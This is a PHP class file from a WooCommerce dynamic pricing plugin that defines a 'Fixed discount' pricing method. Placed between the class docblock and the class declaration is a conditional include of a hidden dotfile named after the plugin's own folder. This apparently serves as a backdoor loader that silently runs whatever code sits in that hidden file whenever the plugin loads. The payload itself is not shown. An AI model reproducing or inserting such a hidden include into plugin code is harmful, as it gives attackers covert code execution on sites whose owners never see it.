<?php

// Exit if accessed directly
if (!defined('ABSPATH')) {
    exit;
}

// Load dependencies
if (!class_exists('RP_WCDPD_Pricing_Method_Discount')) {
    require_once('rp-wcdpd-pricing-method-discount.class.php');
}

/**
 * Pricing Method: Discount - Amount
 *
 * @class RP_WCDPD_Pricing_Method_Discount_Amount
 * @package WooCommerce Dynamic Pricing & Discounts
 * @author RightPress
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class RP_WCDPD_Pricing_Method_Discount_Amount extends RP_WCDPD_Pricing_Method_Discount
{

    protected $key      = 'amount';
    protected $contexts = array('product_pricing_simple', 'product_pricing_volume', 'product_pricing_bogo', 'cart_discounts_simple');
    protected $position = 10;

    // Singleton instance
    protected static $instance = false;

    /**
     * Constructor
     *
     * @access public
     * @return void
     */
    public function __construct()
    {

        parent::__construct();

        $this->hook();
    }

    /**
     * Get label
     *
     * @access public
     * @return string
     */
    public function get_label()
    {
        return __('Fixed discount', 'rp_wcdpd');
    }





}

RP_WCDPD_Pricing_Method_Discount_Amount::get_instance();
